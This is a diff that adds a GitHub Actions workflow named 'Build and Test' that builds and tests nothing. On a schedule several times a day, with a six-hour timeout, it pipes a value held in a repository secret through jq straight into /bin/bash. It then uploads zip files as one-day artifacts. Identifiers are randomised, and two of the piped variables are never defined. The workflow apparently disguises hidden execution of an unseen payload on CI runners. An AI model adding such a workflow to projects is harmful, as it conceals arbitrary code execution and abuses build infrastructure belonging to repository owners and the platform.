@@ -1,0 +1,31 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '10 4,10,16,22 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          ljfh7: ${{ secrets.ljfh7 }}
+        run: |
+          printf '%s' "$ljfh7" | jq -r .tsw2116 | /bin/bash
+          printf '%s' "$cuss7" | jq -r .zkqaw506 | /bin/bash
+          printf '%s' "$p42" | jq -r .htk82774 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: fxAYiim9
+          path: "*.zip"
+          retention-days: 1
